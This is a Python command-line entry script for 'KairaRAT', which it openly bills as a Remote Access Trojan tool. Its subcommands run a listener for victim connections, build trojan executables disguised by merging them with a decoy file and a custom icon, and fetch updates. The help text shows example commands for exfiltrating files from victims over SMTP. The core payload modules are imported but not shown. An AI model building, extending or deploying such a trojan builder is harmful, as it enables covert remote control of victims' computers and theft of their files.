import argparse
from textwrap import dedent
from colorama import init, Fore
from modules import kaira_server
from modules import builder
from modules import update
from modules import template

init()

template_ = template.choose_template()
print(Fore.GREEN + template_)
print(Fore.GREEN + "\n\nRemote Access Trojan tool built with python.\n\n" + Fore.MAGENTA +"instagram: arduinocum.py\n\n" + Fore.GREEN)

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usages:\n\npython3 main.py server -h \npython3 main.py build -h\npython3 main.py update -h"), description=dedent("Mods:\n\nserver:Server for listening connections from client\nbuild:Build a trojan with executable file\nupdate:Check update from internet and update"))
subparsers = parser.add_subparsers(dest="subparser")


parser_listen = subparsers.add_parser("server", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usages:\n\nServer mode without SMTP(you can't download files from victim):\npython3 main.py server -ip <your_ip_address> -p <your_port>\npython3 main.py server -ip 172.28.89.113 -p 4444\n\nServer mode with SMTP(you can download files from victim):\npython3 main.py server -ip <your_ip_address> -p <your_port> -sh <your_smtp_address> -sp <smtp_port> -se <your_smtp_email> -spass <your_smtp_password>\npython3 main.py server -ip 172.28.89.113 -p 4444 -sh 'smtp.gmail.com' -sp 587 -se 'youremail@gmail.com' -spass 'password123'"))
parser_listen.add_argument("-ip", "--ip_address", required=True, help="Set the IP address for server mode")
parser_listen.add_argument("-p", "--port", required=True, type=int, help="Set the Port number for server mode")
parser_listen.add_argument("-sh", "--smtp_host", required=False, help="Set the SMTP host for server mode(optional)")
parser_listen.add_argument("-sp", "--smtp_port", required=False, help="Set the SMTP port for server mode(optional)")
parser_listen.add_argument("-se", "--smtp_email", required=False, help="Set the SMTP email for server mode(optional)")
parser_listen.add_argument("-spass", "--smtp_pass", required=False, help="Set the SMTP password for server mode(optional)")


parser_build = subparsers.add_parser("build", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usages:\n\nBuild kairaRAT with merge file and icon:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port> -m <your_file_to_merge> -i <your_icon_with_.ico_extension>\npython3 main.py build -ip 172.28.89.113 -p 4444 -m merge_file.png -i my_icon.ico -n kaira.exe\n\nBuild kairaRAT just with merge file:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port> -m <your_file_to_merge>\npython3 main.py build -ip 172.28.89.113 -p 4444 -m merge_file.png -n kaira.exe\n\nBuild kairaRAT just with icon:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port> -i <your_icon_file_with_.ico_extension>\npython3 main.py build -ip 172.28.89.113 -p 4444 -i icon.ico -n kaira.exe\n\nBuild kairaRAT without icon or merge file:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port>\npython3 main.py build -ip 172.28.89.113 -p 4444 -n kaira.exe"))
parser_build.add_argument("-ip", "--ip_address", required=True, help="Set the IP address for build KairaRAT")
parser_build.add_argument("-p", "--port", required=True, type=int, help="Set the port number for build KairaRAT")
parser_build.add_argument("-m", "--merge_file", required=False, help="Set the merge file for build KairaRAT(optional)")
parser_build.add_argument("-i", "--icon", required=False, help="Set the icon file for build KairaRAT(optional)")
parser_build.add_argument("-n", "--name", default="client.exe", required=False, help="Set the name for executable file(optional)")


parser_update = subparsers.add_parser("update", epilog="Use 'python3 main.py update' to check updates and make updates.")


args = parser.parse_args()

if args.subparser == "server":
    if args.smtp_host and args.smtp_port and args.smtp_email and args.smtp_pass:
        server = kaira_server.Kaira_Server(args.ip_address, args.port, args.smtp_email, args.smtp_host, args.smtp_port, args.smtp_pass)
        server.core()
    else:
        server = kaira_server.Kaira_Server(args.ip_address, args.port, None, None, None, None)
        server.core()

elif args.subparser == "build":
    if args.merge_file and args.icon:
        try:
            builder.build_with_merge_and_icon(args.ip_address, args.port, args.merge_file, args.icon, args.name)
            print(Fore.GREEN + "[+]Building completed.Check the /builds directory.")
        except:
            print(Fore.RED + "[-]An error occurred while building.")
    elif args.merge_file:
        try:
            builder.build_with_merge(args.ip_address, args.port, args.merge_file, args.name)
            print(Fore.GREEN + "[+]Building completed.Check the /builds directory.")
        except:
            print(Fore.RED + "[-]An error occurred while building.")
    elif args.icon:
        try:
            builder.build_with_icon(args.ip_address, args.port, args.icon, args.name)
            print(Fore.GREEN + "[+]Building completed.Check the /builds directory.")
        except:
            print(Fore.RED + "[-]An error occurred while building.")
    else:
        try:
            builder.default_build(args.ip_address, args.port, args.name)
            print(Fore.GREEN + "[+]Building completed.Check the /builds directory.")
        except:
            print(Fore.RED + "[-]An error occurred while building.")

elif args.subparser == "update":
    update.update()

else:
    parser.print_help()
